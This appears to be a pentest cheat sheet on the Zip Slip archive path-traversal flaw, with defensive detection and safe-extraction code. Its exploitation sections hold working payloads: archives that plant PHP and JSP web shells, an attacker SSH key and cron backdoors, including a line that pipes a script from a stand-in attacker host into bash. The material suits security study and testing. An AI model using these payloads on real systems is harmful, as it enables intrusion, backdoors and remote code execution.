# Zip Slip

## Description
Zip Slip is a directory traversal vulnerability that allows attackers to write files outside the intended extraction directory by including path traversal sequences in archive file names. This can lead to arbitrary file overwrite, code execution, and system compromise.

## Affected Formats

- ZIP
- TAR
- JAR
- WAR
- CPIO
- APK
- RAR
- 7z

## How It Works

1. Attacker creates archive with malicious filenames like `../../evil.sh`
2. Victim extracts archive using vulnerable code
3. File is written outside intended directory
4. Attacker achieves code execution or system compromise

## Exploitation

### Creating Malicious ZIP (Python)
```python
import zipfile

with zipfile.ZipFile('malicious.zip', 'w') as zf:
    # Write shell to web directory
    zf.writestr('../../var/www/html/shell.php',
                '<?php system($_GET["cmd"]); ?>')

    # Overwrite SSH authorized_keys
    zf.writestr('../../root/.ssh/authorized_keys',
                'ssh-rsa AAAA... attacker@localhost')

    # Overwrite cron job
    zf.writestr('../../etc/cron.d/backdoor',
                '* * * * * root /tmp/shell.sh')
```

### Using evilarc
```bash
# https://github.com/ptoomey3/evilarc

# Create malicious archive
python evilarc.py shell.php -o unix -f evil.zip -p var/www/html/ -d 5

# Options:
# -o: target OS (unix/win)
# -f: output filename
# -p: path to prepend
# -d: depth of traversal (number of ../)
```

### Using slipit
```bash
# https://github.com/usdAG/slipit

# Create archive with traversal
slipit evil.zip shell.php --prefix "../../var/www/html/"
```

### Manual TAR Creation
```bash
# Create symbolic link for traversal
ln -s ../../../etc/passwd passwd_link

# Create tar with link
tar cvf malicious.tar passwd_link

# Or with absolute path (some extractors vulnerable)
tar cvf malicious.tar --absolute-names /etc/passwd
```

## Common Payloads

### Web Shell
```python
# Write PHP shell
zf.writestr('../../var/www/html/shell.php',
            '<?php system($_GET["cmd"]); ?>')

# Write JSP shell
zf.writestr('../../tomcat/webapps/ROOT/shell.jsp',
            '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>')
```

### SSH Backdoor
```python
# Add attacker's SSH key
zf.writestr('../../home/user/.ssh/authorized_keys',
            'ssh-rsa AAAA... attacker@localhost')
```

### Cron Job
```python
# Create persistent backdoor
zf.writestr('../../etc/cron.d/backdoor',
            '* * * * * root curl http://attacker.com/shell.sh | bash')
```

### Config File Overwrite
```python
# Overwrite application config
zf.writestr('../../app/config/database.yml',
            'host: attacker.com\nuser: root\npassword: evil')
```

## Vulnerable Code Patterns

### Python (Vulnerable)
```python
import zipfile

with zipfile.ZipFile('archive.zip') as zf:
    zf.extractall('/tmp/extract/')  # VULNERABLE
```

### Java (Vulnerable)
```java
ZipFile zip = new ZipFile(zipFile);
Enumeration<? extends ZipEntry> entries = zip.entries();
while (entries.hasMoreElements()) {
    ZipEntry entry = entries.nextElement();
    File file = new File(destDir, entry.getName());  // VULNERABLE
    // Extract file...
}
```

### Node.js (Vulnerable)
```javascript
const AdmZip = require('adm-zip');
const zip = new AdmZip('archive.zip');
zip.extractAllTo('/tmp/extract/', true);  // VULNERABLE
```

## Detection

### Check Archive Contents
```bash
# List ZIP contents
unzip -l suspicious.zip | grep '\.\.'

# List TAR contents
tar -tvf suspicious.tar | grep '\.\.'

# Check for suspicious paths
zipinfo suspicious.zip | grep -E '^\.\.|/\.\.'
```

### Automated Scanning
```python
import zipfile

def check_zipslip(zip_path):
    with zipfile.ZipFile(zip_path) as zf:
        for name in zf.namelist():
            if '..' in name or name.startswith('/'):
                print(f"[MALICIOUS] {name}")
                return True
    return False
```

## Safe Extraction

### Python
```python
import zipfile
import os

def safe_extract(zip_path, dest_dir):
    with zipfile.ZipFile(zip_path) as zf:
        for member in zf.namelist():
            # Get absolute path
            member_path = os.path.join(dest_dir, member)
            abs_dest = os.path.abspath(dest_dir)
            abs_member = os.path.abspath(member_path)

            # Check if path is within destination
            if not abs_member.startswith(abs_dest):
                raise Exception(f"Path traversal detected: {member}")

            zf.extract(member, dest_dir)
```

### Java
```java
public void safeExtract(ZipFile zip, File destDir) throws Exception {
    Enumeration<? extends ZipEntry> entries = zip.entries();
    while (entries.hasMoreElements()) {
        ZipEntry entry = entries.nextElement();
        File file = new File(destDir, entry.getName());

        // Validate path
        String canonicalDest = destDir.getCanonicalPath();
        String canonicalFile = file.getCanonicalPath();

        if (!canonicalFile.startsWith(canonicalDest)) {
            throw new Exception("Path traversal detected: " + entry.getName());
        }

        // Extract safely...
    }
}
```

### Node.js
```javascript
const path = require('path');
const fs = require('fs');

function safeExtract(zipPath, destDir) {
    const AdmZip = require('adm-zip');
    const zip = new AdmZip(zipPath);
    const entries = zip.getEntries();

    entries.forEach(entry => {
        const filePath = path.join(destDir, entry.entryName);
        const resolvedPath = path.resolve(filePath);
        const resolvedDest = path.resolve(destDir);

        if (!resolvedPath.startsWith(resolvedDest)) {
            throw new Error(`Path traversal detected: ${entry.entryName}`);
        }

        // Extract safely...
    });
}
```

## Testing Checklist

- [ ] Identify archive upload/extraction functionality
- [ ] Create archive with path traversal filenames
- [ ] Test with different traversal depths (../, ../../, etc.)
- [ ] Test with different archive formats
- [ ] Test writing to sensitive locations
- [ ] Test absolute path injection
- [ ] Test symbolic link extraction

## Impact Scenarios

| Target | Impact |
|--------|--------|
| Web root | RCE via web shell |
| SSH keys | Unauthorized access |
| Cron jobs | Persistent backdoor |
| Application configs | Credential theft |
| System binaries | System compromise |
| Startup scripts | Persistent RCE |

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Zip%20Slip
- https://snyk.io/research/zip-slip-vulnerability
- https://github.com/snyk/zip-slip-vulnerability
